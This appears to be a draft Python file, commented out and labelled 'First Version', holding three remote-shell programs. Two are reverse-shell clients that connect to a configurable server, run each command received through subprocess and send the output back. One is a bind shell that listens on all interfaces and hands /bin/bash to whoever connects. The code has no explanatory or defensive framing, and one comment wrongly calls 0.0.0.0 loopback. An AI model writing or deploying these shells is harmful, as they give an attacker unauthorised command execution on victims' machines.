
#################
# First Version #
#################

# import socket
# import subprocess

# # set up the connection
# HOST = '0.0.0.0'  # replace with the IP address of the server
# PORT = 1234       # replace with the port number of the server
# s = socket.socket()
# s.connect((HOST, PORT))

# # start the interactive shell
# while True:
#     # receive the command from the server
#     data = s.recv(1024)
#     if not data:
#         break
#     cmd = data.decode()

#     # execute the command and get the output
#     output = subprocess.getoutput(cmd)

#     # send the output back to the server
#     s.send(output.encode())

# # close the connection
# s.close()



# import socket
# import subprocess

# HOST = '0.0.0.0'  # Standard loopback interface address (localhost)
# PORT = 12345      # Port to listen on

# def listen():
#     # Create a TCP/IP socket
#     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#     # Bind the socket to a specific address and port
#     sock.bind((HOST, PORT))

#     # Listen for incoming connections
#     sock.listen(1)

#     # Wait for a connection
#     print(f"Listening on {HOST}:{PORT}")
#     conn, addr = sock.accept()
#     print(f"Connected by {addr}")

#     # Start an interactive shell session
#     subprocess.call("/bin/bash", shell=True, stdin=conn, stdout=conn, stderr=conn)

#     # Clean up the connection
#     conn.close()

# if __name__ == '__main__':
#     listen()






# import socket
# import subprocess

# HOST = '0.0.0.0' # Server IP address
# PORT = 12345 # Server port

# # Start a shell process
# shell = subprocess.Popen(['/bin/bash'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#     s.connect((HOST, PORT))

#     while True:
#         # Receive a command from the server
#         command = s.recv(1024).decode()

#         if not command:
#             break

#         # Write the command to the shell process and flush the buffer
#         shell.stdin.write(command.encode())
#         shell.stdin.flush()

#         # Read the output from the shell process
#         output = shell.stdout.read()

#         # Send the output back to the server
#         s.sendall(output)